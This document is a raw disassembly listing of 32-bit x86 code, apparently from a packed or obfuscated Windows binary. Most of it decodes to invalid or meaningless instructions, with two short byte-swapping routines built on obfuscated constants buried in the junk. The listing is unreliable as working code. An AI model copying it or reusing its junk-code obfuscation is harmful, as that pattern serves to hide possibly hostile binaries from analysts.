  40c059:	xchg   BYTE PTR [ebx],ch
  40c05b:	inc    edx
  40c05c:	popf   
  40c05d:	inc    esp
  40c05e:	(bad)  
  40c05f:	lahf   
  40c060:	das    
  40c061:	loop   0x40c020
  40c063:	test   eax,0x18661904
  40c068:	push   esp
  40c069:	je     0x40c084
  40c06b:	stos   DWORD PTR es:[edi],eax
  40c06c:	out    dx,eax
  40c06d:	and    eax,0xd8877cf9
  40c072:	xchg   esi,eax
  40c073:	rcl    dh,1
  40c075:	repnz fucomip st,st(3)
  40c078:	mov    eax,0xba989545
  40c07d:	push   0xd4fba4b1
  40c082:	jl     0x40c02d
  40c084:	call   DWORD PTR [ebp+0x4c]
  40c087:	test   eax,0x419a6db0
  40c08c:	push   edx
  40c08d:	mov    ah,0x85
  40c08f:	(bad)  
  40c090:	push   ecx
  40c091:	push   esp
  40c092:	or     BYTE PTR [ebp-0x6cdc3b54],ch
  40c098:	div    DWORD PTR [ebx+0x45]
  40c09b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c09c:	fdivr  st,st(6)
  40c09e:	in     al,0xef
  40c0a0:	(bad)  
  40c0a1:	dec    BYTE PTR [ebp+eax*2+0x7b]
  40c0a5:	sahf   
  40c0a6:	jmp    0x1d07:0xa387b9c7
  40c0ad:	ds mov bl,0x66
  40c0b0:	dec    esi
  40c0b1:	mov    edx,cs
  40c0b3:	stos   DWORD PTR es:[edi],eax
  40c0b4:	cmp    ch,ah
  40c0b6:	div    BYTE PTR [ebx-0x3fd3cbde]
  40c0bc:	add    DWORD PTR [ebx],ebx
  40c0be:	lock sub eax,0xa5add18f
  40c0c4:	(bad)  
  40c0c5:	(bad)  
  40c0c6:	loope  0x40c10d
  40c0c8:	mov    ds:0x1fb125e4,al
  40c0cd:	push   edx
  40c0ce:	mov    bh,dl
  40c0d0:	or     BYTE PTR [ebp+0x3f840ae5],ch
  40c0d6:	sub    eax,0x954c0a39
  40c0db:	ins    BYTE PTR es:[edi],dx
  40c0dc:	fisttp QWORD PTR [ecx-0x3a]
  40c0df:	jnp    0x40c143
  40c0e1:	loopne 0x40c0ea
  40c0e3:	stos   BYTE PTR es:[edi],al
  40c0e4:	adc    DWORD PTR [esi-0x35837211],edx
  40c0ea:	sbb    cl,BYTE PTR [ebx+0x7d8bc455]
  40c0f0:	cld    
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov sp,bp
  40c144:	inc    edi
  40c145:	cmp    eax,0x708b2eff
  40c14a:	jo     0x40c0eb
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c12d
  40c150:	test   BYTE PTR [edx+0x1b],dl
  40c153:	popf   
  40c154:	and    ah,BYTE PTR [ecx+0x1b]
  40c157:	xor    al,0xfe
  40c159:	jg     0x40c1be
  40c15b:	lds    ecx,FWORD PTR [ecx+0x1082ab15]
  40c161:	call   0x846:0x999acd2
  40c168:	push   eax
  40c169:	loopne 0x40c156
  40c16b:	(bad)  
  40c16c:	mov    es,WORD PTR [edx]
  40c16e:	mov    edi,0x8d9b07c7
  40c173:	or     DWORD PTR [edi-0x1b180f8b],ebx
  40c179:	mov    eax,0x2d7a1f2a
  40c17e:	rol    BYTE PTR ds:0xd83e462a,1
  40c184:	add    bh,BYTE PTR [ebx+0x2dc2036d]
  40c18a:	cmc    
  40c18b:	lahf   
  40c18c:	inc    edi
  40c18d:	xchg   ecx,eax
  40c18e:	pop    ds
  40c18f:	push   edx
  40c190:	sar    BYTE PTR [edi*4-0x34bfec4],1
  40c197:	mov    BYTE PTR [ecx-0x7e6bc548],ch
  40c19d:	push   eax
  40c19e:	mov    bl,bl
  40c1a0:	int    0x4c
  40c1a2:	pop    esi
  40c1a3:	sar    DWORD PTR [edi+ebx*8],1
  40c1a6:	push   edx
  40c1a7:	jp     0x40c1f3
  40c1a9:	cld    
  40c1aa:	retf   
  40c1ab:	gs sub eax,0x2213cab2
  40c1b1:	xchg   esi,eax
  40c1b2:	pop    edi
  40c1b3:	fstp   DWORD PTR [eax-0x13]
  40c1b6:	fwait
  40c1b7:	xor    eax,0xa94f6374
  40c1bc:	int    0x55
  40c1be:	xchg   ebx,eax
  40c1bf:	wbinvd 
  40c1c1:	pop    ss
  40c1c2:	or     al,0xd1
  40c1c4:	fcomi  st,st(5)
  40c1c6:	sbb    bl,BYTE PTR [ebp-0x6d]
  40c1c9:	add    edi,DWORD PTR [ecx+0x56]
  40c1cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1cd:	call   FWORD PTR [esi]
  40c1cf:	cmp    eax,0xaf4511fa
  40c1d4:	ja     0x40c15c
  40c1d6:	and    al,0x21
  40c1d8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c1da:	jb     0x40c1e1
  40c1dc:	add    ah,BYTE PTR [edi+0x323f2839]
  40c1e2:	push   edi
  40c1e3:	and    DWORD PTR ds:0x1ad9c085,edi
  40c1e9:	inc    ecx
  40c1ea:	lock nop
  40c1ec:	ins    DWORD PTR es:[edi],dx
  40c1ed:	sbb    al,0xa5
  40c1ef:	mov    ecx,0xe18b6e52
  40c1f4:	sub    cl,0xa6
  40c1f7:	in     al,dx
  40c1f8:	rcr    BYTE PTR [edi+0x1b],1
  40c1fb:	aaa    
  40c1fc:	pushf  
  40c1fd:	add    eax,0xa7a0a7d5
  40c202:	into   
  40c203:	cmp    al,0xdf
  40c205:	aad    0xce
  40c207:	add    al,0x8a
  40c209:	scas   eax,DWORD PTR es:[edi]
  40c20a:	mov    cl,bh
  40c20c:	test   BYTE PTR [edx],dh
  40c20e:	push   esp
  40c20f:	loopne 0x40c25c
  40c211:	cs sub dh,bh
  40c214:	aad    0x4a
  40c216:	fdivr  QWORD PTR [ebx+0x64]
  40c219:	loope  0x40c28e
  40c21b:	xchg   esi,eax
  40c21c:	pop    ebx
  40c21d:	dec    eax
  40c21e:	sbb    al,0xed
  40c220:	sbb    bh,BYTE PTR [edx-0x1b1d3e2c]
  40c226:	bound  edx,QWORD PTR [ebx-0x35]
  40c229:	inc    ebp
  40c22a:	dec    eax
  40c22b:	pop    eax
  40c22c:	sbb    BYTE PTR [edx-0x5aa6a1ce],0x6a
  40c233:	cmp    cl,BYTE PTR [ecx-0xf146862]
  40c239:	cmp    dl,BYTE PTR [esi-0x7f]
  40c23c:	(bad)  
  40c23d:	mov    ch,0x3e
  40c23f:	cmp    bh,al
  40c241:	mov    esp,DWORD PTR [edx*8+0x7748b2c6]
  40c248:	adc    eax,0xf9eb85c5
  40c24d:	jno    0x40c2b4
  40c24f:	cmp    BYTE PTR [esi-0x2151e15a],ch
  40c255:	adc    eax,0x804d2bb7
  40c25a:	ins    BYTE PTR es:[edi],dx
  40c25b:	mov    ds:0xc6319596,al
  40c260:	or     edx,ebp
  40c262:	dec    esp
  40c263:	mov    esi,0x8fa7c120
  40c268:	call   FWORD PTR [ecx-0x31]
  40c26b:	xchg   DWORD PTR [esi+eiz*2-0xc26a148],edx
  40c272:	mov    esi,edx
  40c274:	ret    0xfe90
  40c277:	aas    
  40c278:	cmp    DWORD PTR [eax+eiz*2],ebp
  40c27b:	adc    DWORD PTR [ebx],esi
  40c27d:	mov    al,0xd1
  40c27f:	cld    
  40c280:	addr16 lahf 
  40c282:	bound  esi,QWORD PTR [edi+0xf]
  40c285:	and    eax,0x3811e64c
  40c28a:	test   eax,esi
  40c28c:	aam    0x34
  40c28e:	adc    esp,DWORD PTR [eax-0x74]
  40c291:	jns    0x40c2d0
  40c293:	xchg   ecx,eax
  40c294:	fadd   DWORD PTR ds:0xfc479a48
  40c29a:	jl     0x40c296
  40c29c:	sub    eax,0x9077536
  40c2a1:	test   BYTE PTR [ebx-0x55],al
  40c2a4:	inc    ecx
  40c2a5:	xor    esp,ecx
  40c2a7:	outs   dx,DWORD PTR ds:[esi]
  40c2a8:	(bad)  
  40c2aa:	dec    ebp
  40c2ab:	xlat   BYTE PTR ds:[ebx]
  40c2ac:	lea    edx,[eax+0x76738ab9]
  40c2b2:	jl     0x40c289
  40c2b4:	or     bl,BYTE PTR [ebx+esi*4-0x57]
  40c2b8:	or     dh,BYTE PTR [edx-0x3f5467c7]
  40c2be:	mov    edi,0x31703b7a
  40c2c3:	fild   QWORD PTR [edx-0x59ef5a92]
  40c2c9:	inc    ebx
  40c2ca:	jl     0x40c349
  40c2cc:	mov    al,0xbf
  40c2ce:	dec    edx
  40c2cf:	mov    ch,0x53
  40c2d1:	push   cs
  40c2d2:	dec    edi
  40c2d3:	int    0xdd
  40c2d5:	push   DWORD PTR [edi+0x1e5dcd3d]
  40c2db:	aaa    
  40c2dc:	into   
  40c2dd:	out    0x4a,eax
  40c2df:	out    dx,eax
  40c2e0:	mov    edx,DWORD PTR [esi+0x414bfd1a]
  40c2e6:	push   ebp
  40c2e7:	pop    esi
  40c2e8:	pop    esp
  40c2e9:	push   eax
  40c2ea:	push   ebx
  40c2eb:	mov    DWORD PTR [eax],esi
  40c2ed:	xchg   ebp,eax
  40c2ee:	mov    edi,ebp
  40c2f0:	leave  
  40c2f1:	retf   
  40c2f2:	loop   0x40c351
  40c2f4:	mov    ebx,esp
  40c2f6:	test   edx,ecx
  40c2f8:	(bad)  
  40c2f9:	mov    ebx,0x88e6cc0a
  40c2fe:	sbb    ecx,esi
  40c300:	adc    DWORD PTR [ecx-0x11],esi
  40c303:	aam    0xcc
  40c305:	sub    bh,bl
  40c307:	cwde   
  40c308:	sub    eax,0xabde6a80
  40c30d:	(bad)  
  40c30e:	push   0xffffffa5
  40c310:	inc    esi
  40c311:	mov    esi,0x28044ebe
  40c316:	dec    ebx
  40c317:	ds out dx,eax
  40c319:	clc    
  40c31a:	pushf  
  40c31b:	xor    BYTE PTR [edx+0x5f],cl
  40c31e:	enter  0xd569,0xb
  40c322:	jp     0x40c2a5
  40c324:	mov    ds:0xdc193220,eax
  40c329:	mov    BYTE PTR [esi+edi*2-0x4adf68c2],0x83
  40c331:	pop    esi
  40c332:	imul   ebx,DWORD PTR [ebx+0x61],0xfe6ae77
  40c339:	aaa    
  40c33a:	(bad)
  40c33d:	out    dx,eax
  40c33e:	and    eax,esi
  40c340:	(bad)  
  40c341:	xor    eax,0xa569aed3
  40c346:	pushf  
  40c347:	enter  0x8d54,0x54
  40c34b:	sub    eax,0x77f994fa
  40c350:	pop    esi
  40c351:	inc    esi
  40c352:	jge    0x40c3b9
  40c354:	stc    
  40c355:	js     0x40c39a
  40c357:	repz sbb al,BYTE PTR [edi]
  40c35a:	fdivr  st,st(4)
  40c35c:	(bad)  
  40c35d:	mov    cl,0x39
  40c35f:	loope  0x40c30e
  40c361:	jae    0x40c384
  40c363:	ret    0xc64f
  40c366:	pop    edi
  40c367:	mov    BYTE PTR [ebx],dh
  40c369:	cmp    edx,DWORD PTR [ecx+0x17]
  40c36c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c36d:	fist   WORD PTR [ecx]
  40c36f:	imul   edi,esp,0x7655ec2c
  40c375:	mov    ah,0xef
  40c377:	arpl   WORD PTR [edi],ax
  40c379:	setne  BYTE PTR [eax+0x773e00c7]
  40c380:	jecxz  0x40c3f6
  40c382:	and    eax,0x81963e5f
  40c387:	or     eax,0x69f014bc
  40c38c:	test   DWORD PTR [edi],ecx
  40c38e:	xchg   ebp,eax
  40c38f:	dec    edi
  40c390:	and    al,0xaa
  40c392:	into   
  40c393:	or     al,0x63
  40c395:	ja     0x40c40e
  40c397:	scas   eax,DWORD PTR es:[edi]
  40c398:	jnp    0x40c356
  40c39a:	clts   
  40c39c:	mov    ds:0x5637befc,al
  40c3a1:	pusha  
  40c3a2:	push   ss
  40c3a3:	arpl   WORD PTR [eax],dx
  40c3a5:	and    DWORD PTR [ecx-0x1a96e9a5],esi
  40c3ab:	out    0x65,eax
  40c3ad:	xchg   edi,eax
  40c3ae:	imul   edi,DWORD PTR [eax-0xf8a6e84],0x665b955f
  40c3b8:	mov    bl,0x92
  40c3ba:	in     eax,0xca
  40c3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3bd:	mov    eax,ds:0x720fe743
  40c3c2:	mov    ebx,0x7aa13590
  40c3c7:	xor    ecx,ebp
  40c3c9:	aas    
  40c3ca:	test   dl,bl
  40c3cc:	mov    esi,0x3bbc0f0a
  40c3d1:	mov    dl,0xef
  40c3d3:	dec    edx
  40c3d4:	in     al,0x3c
  40c3d6:	iret   
  40c3d7:	int3   
  40c3d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3d9:	jp     0x40c457
  40c3db:	inc    ecx
  40c3dc:	rcl    ebp,0x35
  40c3df:	imul   esp,DWORD PTR [edx-0x74995630],0xe8ce1592
  40c3e9:	cld    
  40c3ea:	into   
  40c3eb:	pop    ds
  40c3ec:	pushf  
  40c3ed:	int    0x1d
  40c3ef:	rcr    DWORD PTR gs:[ebx],cl
  40c3f2:	clc    
  40c3f3:	lea    ebp,[ebx]
  40c3f5:	add    BYTE PTR [ebp-0x2d40af52],0xe5
  40c3fc:	fcmovnu st,st(4)
  40c3fe:	ds push gs
  40c401:	xor    DWORD PTR [ecx],ebp
  40c403:	xor    DWORD PTR [ebp+0x61c35736],edx
  40c409:	ja     0x40c3d3
  40c40b:	clc    
  40c40c:	ds pop ds
  40c40e:	sahf   
  40c40f:	cld    
  40c410:	cmp    dh,dl
  40c412:	test   DWORD PTR [ebp-0x10cbe633],esp
  40c418:	fwait
  40c419:	gs das 
  40c41b:	cld    
  40c41c:	jg     0x40c426
  40c41e:	test   DWORD PTR ds:0x5b242723,esp
  40c424:	sbb    BYTE PTR [ecx],ah
  40c426:	cmp    eax,0xe181fe19
  40c42b:	or     eax,0x3e6ef5b0
  40c430:	xchg   BYTE PTR [eax+0x10],bl
  40c433:	test   eax,0x8f458fd5
  40c438:	push   esi
  40c439:	push   ecx
  40c43a:	and    BYTE PTR [ebx-0x45],dl
  40c43d:	test   bh,0x73
  40c440:	pop    esp
  40c441:	cld    
  40c442:	das    
  40c443:	pop    esp
  40c444:	add    bl,bl
  40c446:	jae    0x40c3e1
  40c448:	fst    DWORD PTR ds:0xff17be1f
  40c44e:	sub    ch,ah
  40c450:	leave  
  40c451:	cmp    al,0x66
  40c453:	mov    ds:0x6299a00c,eax
  40c458:	fsub   QWORD PTR [edi+0x15]
  40c45b:	ret    
  40c45c:	sar    DWORD PTR [eax+0x64c3de3a],0x8f
  40c463:	mov    edx,0x8bb4edc2
  40c468:	scas   al,BYTE PTR es:[edi]
  40c469:	and    ecx,DWORD PTR [ebp+edx*8-0x6c]
  40c46d:	icebp  
  40c46e:	jge    0x40c433
  40c470:	push   cs
  40c471:	outs   dx,DWORD PTR ds:[esi]
  40c472:	or     BYTE PTR [ebp-0x26],0xb5
  40c476:	or     edi,DWORD PTR [ebp-0x64]
  40c479:	test   eax,0x54fe57fa
  40c47e:	push   esp
  40c47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c480:	popa   
  40c481:	add    BYTE PTR [ebp-0x10],0xb
  40c485:	sub    bh,ch
  40c487:	mov    edi,0x85060087
  40c48c:	ror    DWORD PTR ds:[edx-0x7f],cl
  40c490:	stc    
  40c491:	mov    dl,0x35
  40c493:	or     DWORD PTR [edi+0x29a708c9],ebx
  40c499:	lock clc 
  40c49b:	sbb    eax,0xbde28c30
  40c4a0:	push   ss
  40c4a1:	dec    ebp
  40c4a2:	mov    ecx,eax
  40c4a4:	stos   BYTE PTR es:[edi],al
  40c4a5:	jbe    0x40c4ca
  40c4a7:	xor    DWORD PTR [eax-0x53],ecx
  40c4aa:	jmp    0x83e2:0x442fc9d5
  40c4b1:	cmc    
  40c4b2:	(bad)  
  40c4b3:	xchg   edx,eax
  40c4b4:	or     eax,0x1a279c50
  40c4b9:	add    eax,0x20627cf1
  40c4be:	retf   0xf3d5
  40c4c1:	pop    edi
  40c4c2:	xchg   edi,eax
  40c4c3:	add    BYTE PTR [ebp+eax*2-0x78],bh
  40c4c7:	mov    dh,0x2c
  40c4c9:	outs   dx,BYTE PTR ds:[esi]
  40c4ca:	push   0x9b0fb46b
  40c4cf:	push   eax
  40c4d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4d1:	retf   
  40c4d2:	pop    ebp
  40c4d3:	sbb    al,0x40
  40c4d5:	leave  
  40c4d6:	test   eax,0x5c3aae41
  40c4db:	sbb    ch,BYTE PTR [esi]
  40c4dd:	imul   eax,DWORD PTR [ebx+0x3d565258],0xabbc2131
  40c4e7:	mov    ah,0x22
  40c4e9:	lock fstp DWORD PTR [eax]
  40c4ec:	popa   
  40c4ed:	push   0xffffff90
  40c4ef:	call   0x8bec:0x5503d033
  40c4f6:	jge    0x40c4dc
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	mov    cl,0xb3
  40c542:	cmp    BYTE PTR [ebx+0x7070884d],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c58c
  40c54d:	jno    0x40c52f
  40c54f:	dec    edi
  40c550:	or     edi,ebp
  40c552:	call   ebx
  40c554:	sti    
  40c555:	xchg   edx,eax
  40c556:	pop    esp
  40c557:	outs   dx,BYTE PTR ds:[esi]
  40c558:	imul   edi,DWORD PTR [edx-0x56],0x6f3c46b3
  40c55f:	popf   
  40c560:	in     al,dx
  40c561:	hlt    
  40c562:	and    al,0x6c
  40c564:	jg     0x40c505
  40c566:	pop    esi
  40c567:	jbe    0x40c5dc
  40c569:	rol    BYTE PTR [esi+0x27cbb666],cl
  40c56f:	clc    
  40c570:	xchg   ebx,eax
  40c571:	leave  
  40c572:	inc    ecx
  40c573:	test   eax,0xb7012578
  40c578:	dec    ebx
  40c579:	inc    esp
  40c57a:	out    0x91,eax
  40c57c:	xor    ebp,0x7d
  40c57f:	add    BYTE PTR [edi+0x69eb4f72],cl
  40c585:	xchg   BYTE PTR [edx-0x163c6643],bh
  40c58b:	or     al,0xff
  40c58d:	popa   
  40c58e:	adc    eax,0x1c2c81e5
  40c593:	pop    ss
  40c594:	push   ss
  40c595:	xor    eax,DWORD PTR ds:0x8670dc40
  40c59b:	sbb    eax,0x6e2c7675
  40c5a0:	shl    DWORD PTR [ebp+0x6daa04b5],0xd1
  40c5a7:	adc    DWORD PTR [esi],0xffffffc9
  40c5aa:	jae    0x40c555
  40c5ac:	lock cmc 
  40c5ae:	pop    esp
  40c5af:	out    0xc5,eax
  40c5b1:	mov    ecx,0x1cf9f529
  40c5b6:	inc    ebx
  40c5b7:	pop    edi
  40c5b8:	dec    eax
  40c5b9:	jns    0x40c59e
  40c5bb:	pop    ecx
  40c5bc:	ja     0x40c53f
  40c5be:	(bad)  
  40c5c0:	add    DWORD PTR ds:0x74ccd1d3,edx
  40c5c6:	dec    ebp
  40c5c7:	sbb    dh,dl
  40c5c9:	test   eax,0x385e2da1
  40c5ce:	cdq    
  40c5cf:	inc    esp
  40c5d0:	retf   0x12a9
  40c5d3:	in     al,dx
  40c5d4:	mov    ch,0xcf
  40c5d6:	fwait
  40c5d7:	hlt    
  40c5d8:	cld    
  40c5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5da:	enter  0xa5a1,0xbc
  40c5de:	mov    al,ds:0x4ef2b4ea
  40c5e3:	idiv   BYTE PTR [edx+0x184a3209]
  40c5e9:	mov    esi,0xd5c00d1d
  40c5ee:	mov    cl,0x2e
  40c5f0:	popf   
  40c5f1:	ror    DWORD PTR [ebx-0x1f],cl
  40c5f4:	outs   dx,BYTE PTR ds:[esi]
  40c5f5:	and    al,0xc0
  40c5f7:	cmp    bh,BYTE PTR [eax-0x3c]
  40c5fa:	inc    esp
  40c5fb:	push   es
  40c5fc:	inc    edx
  40c5fd:	xchg   ecx,eax
  40c5fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ff:	shl    DWORD PTR [esi+0x41605d52],0x6f
  40c606:	loope  0x40c605
  40c608:	inc    esp
  40c609:	mov    dl,0x8a
  40c60b:	sub    DWORD PTR [ecx+0x43],ebx
  40c60e:	clc    
  40c60f:	aas    
  40c610:	sub    al,0x63
  40c612:	into   
  40c613:	and    ebx,DWORD PTR [edx+0x46d2e912]
  40c619:	les    ebp,FWORD PTR [ebx+0x62595073]
  40c61f:	mov    eax,0xd1192e35
  40c624:	pop    edx
  40c625:	push   eax
  40c626:	pop    ecx
  40c627:	jmp    0x8d16:0x14088085
  40c62e:	mov    ds:0x8ec832fb,al
  40c633:	loopne 0x40c625
  40c635:	xchg   edi,eax
  40c636:	ins    BYTE PTR es:[edi],dx
  40c637:	xchg   edi,eax
  40c638:	mov    edi,0x53a6ef09
  40c63d:	xchg   edi,eax
  40c63e:	popf   
  40c63f:	das    
  40c640:	int    0x1e
  40c642:	push   cs
  40c643:	cmp    al,0x94
  40c645:	xor    eax,0xee63b9b7
  40c64a:	into   
  40c64b:	push   0xffffff90
  40c64d:	int3   
  40c64e:	lock and dh,BYTE PTR es:[ebx]
  40c652:	and    eax,0x4b92c53f
  40c657:	clc    
  40c658:	jno    0x40c6b6
  40c65a:	jecxz  0x40c60d
  40c65c:	jmp    0x40c66c
  40c65e:	xor    BYTE PTR [ebp+edx*2-0x36b1f393],al
  40c665:	ins    BYTE PTR es:[edi],dx
  40c666:	mov    bh,0xc1
  40c668:	pop    edx
  40c669:	aas    
  40c66a:	cwde   
  40c66b:	and    al,0xff
  40c66d:	dec    eax
  40c66e:	sti    
  40c66f:	or     esp,DWORD PTR [esi]
  40c671:	or     al,0x7a
  40c673:	aad    0xb1
  40c675:	xchg   esi,eax
  40c676:	pop    ecx
  40c677:	push   ds
  40c678:	inc    esp
  40c679:	outs   dx,BYTE PTR cs:[esi]
  40c67b:	inc    ebp
  40c67c:	enter  0xef3f,0xdc
  40c680:	and    esp,ebx
  40c682:	or     esi,DWORD PTR [ebx+eiz*4+0x60]
  40c686:	std    
  40c687:	xor    eax,DWORD PTR [eax-0x5679755c]
  40c68d:	js     0x40c630
  40c68f:	loopne 0x40c64f
  40c691:	(bad)  
  40c692:	out    0xc9,eax
  40c694:	mov    cl,0xb7
  40c696:	sub    DWORD PTR [esi+0x55],ebx
  40c699:	cwde   
  40c69a:	cmp    cl,BYTE PTR [edi+0xd]
  40c69d:	inc    esp
  40c69e:	nop
  40c69f:	enter  0x84a9,0x56
  40c6a3:	stos   DWORD PTR es:[edi],eax
  40c6a4:	mov    es,WORD PTR [esi-0x6d]
  40c6a7:	jns    0x40c62c
  40c6a9:	inc    ebx
  40c6aa:	mov    ah,0xeb
  40c6ac:	loope  0x40c719
  40c6ae:	push   eax
  40c6af:	push   esp
  40c6b0:	dec    edi
  40c6b1:	gs add eax,0xa4b80aec
  40c6b7:	or     DWORD PTR [esi-0x3f10e08e],ecx
  40c6bd:	xor    BYTE PTR [ebx+0x4892dfdb],ah
  40c6c3:	mov    edi,0x80d0973
  40c6c8:	add    dl,BYTE PTR [ebx-0x72f3d639]
  40c6ce:	je     0x40c74b
  40c6d0:	jne    0x40c6c9
  40c6d2:	fs jl  0x40c659
  40c6d5:	push   eax
  40c6d6:	inc    esp
  40c6d7:	xchg   BYTE PTR [ebx-0x77],dh
  40c6da:	pop    ss
  40c6db:	mov    ebp,ss
  40c6dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6de:	mov    ds:0x85399e56,al
  40c6e3:	in     al,dx
  40c6e4:	dec    esp
  40c6e5:	rol    DWORD PTR [esi+0x53],1
  40c6e8:	iret   
  40c6e9:	shr    BYTE PTR [ebx+0x65d606e0],cl
  40c6ef:	iret   
  40c6f0:	xchg   ebp,eax
  40c6f1:	(bad)  
  40c6f2:	mov    ecx,0xa06b0f16
  40c6f7:	pop    ebp
  40c6f8:	mov    esp,ecx
  40c6fa:	xchg   esp,eax
  40c6fb:	dec    edx
  40c6fc:	retf   0xa6c6
  40c6ff:	mov    WORD PTR [ebx-0x551c85fe],fs
  40c705:	test   eax,0x5f0845df
  40c70a:	mov    dh,0xd0
  40c70c:	inc    ebx
  40c70d:	fnop   
  40c70f:	mov    ebx,0x40ce82c4
  40c714:	push   edi
  40c715:	enter  0x2a4d,0x7b
  40c719:	sahf   
  40c71a:	mov    al,0x83
  40c71c:	leave  
  40c71d:	test   al,0x38
  40c71f:	aas    
  40c720:	push   ebp
  40c721:	adc    BYTE PTR [ecx+eiz*8+0x48a91383],ch
  40c728:	mov    eax,ds:0xa792a609
  40c72d:	out    0x56,eax
  40c72f:	xor    ch,BYTE PTR ds:0x17ef4d8d
  40c735:	mov    ebp,0xa62178a1
  40c73a:	bound  edi,QWORD PTR [edx]
  40c73c:	pop    ds
  40c73d:	fwait
  40c73e:	xlat   BYTE PTR ds:[ebx]
  40c73f:	iret   
  40c740:	sub    DWORD PTR cs:[esi-0x24],0x63
  40c745:	push   0x53ed41b7
  40c74a:	ds jns 0x40c7b6
  40c74d:	mov    edi,0xda8e03af
  40c752:	mov    eax,ds:0x436e35f1
  40c757:	dec    esi
  40c758:	sub    DWORD PTR [esi],0x956d93be
  40c75e:	(bad)  
  40c75f:	pop    esp
  40c760:	jbe    0x40c747
  40c762:	pushf  
  40c763:	jg     0x40c745
  40c765:	push   es
  40c766:	add    al,0x48
  40c768:	push   edi
  40c769:	arpl   WORD PTR [ebx+0x19],dx
  40c76c:	cmp    al,0x26
  40c76e:	lahf   
  40c76f:	outs   dx,BYTE PTR ds:[esi]
  40c770:	push   eax
  40c771:	or     eax,0x608a154e
  40c776:	imul   edi,ebx,0xb6a5ad3d
  40c77c:	sub    edi,DWORD PTR [edx+edx*2+0x7b]
  40c780:	lock dec edx
  40c782:	ss jge 0x40c7ad
  40c785:	aaa    
  40c786:	leave  
  40c787:	ret    0x960d
  40c78a:	mov    DWORD PTR [ecx+0x4],ebx
  40c78d:	test   al,0x0
  40c78f:	out    0x17,al
  40c791:	pop    edi
  40c792:	cmp    dl,dl
  40c794:	arpl   di,dx
  40c796:	add    DWORD PTR [ecx+esi*1],eax
  40c799:	mov    ?,WORD PTR [ebx]
  40c79b:	sub    eax,0xad4763bf
  40c7a0:	mov    esi,0x30bea6bb
  40c7a5:	cli    
  40c7a6:	div    DWORD PTR [ebx+ecx*4-0x44c9a255]
  40c7ad:	jae    0x40c806
  40c7af:	scas   eax,DWORD PTR es:[edi]
  40c7b0:	mov    WORD PTR [eax-0x2ffb67bc],fs
  40c7b6:	pop    ecx
  40c7b7:	add    edi,edi
  40c7b9:	shl    BYTE PTR [ebp-0x70e35b56],0x1f
  40c7c0:	out    dx,eax
  40c7c1:	pop    eax
  40c7c2:	and    BYTE PTR [esi],ah
  40c7c4:	add    dh,BYTE PTR [ebx]
  40c7c6:	xchg   BYTE PTR [ecx+0x6d],ah
  40c7c9:	xchg   eax,eax
  40c7cb:	and    dl,0xe6
  40c7ce:	ins    BYTE PTR es:[edi],dx
  40c7cf:	fstp   QWORD PTR es:[eax+0x7]
  40c7d3:	jno    0x40c806
  40c7d5:	aad    0xb
  40c7d7:	mov    esp,0xd97f6668
  40c7dc:	mov    WORD PTR [ecx-0x6e0b671a],ss
  40c7e2:	mov    esp,?
  40c7e4:	(bad)  [edi+edi*8+0x3fe1e5b3]
  40c7eb:	cmp    al,0x6c
  40c7ed:	mov    edx,0x9d48ed41
  40c7f2:	xor    ah,BYTE PTR [ebx+eax*1-0x19ddb4d5]
  40c7f9:	mov    edi,0x5d905796
  40c7fe:	jns    0x40c879
  40c800:	fsubr  DWORD PTR [edx]
  40c802:	sub    eax,0x97347d1b
  40c807:	jno    0x40c82d
  40c809:	push   esi
  40c80a:	jle    0x40c863
  40c80c:	dec    esi
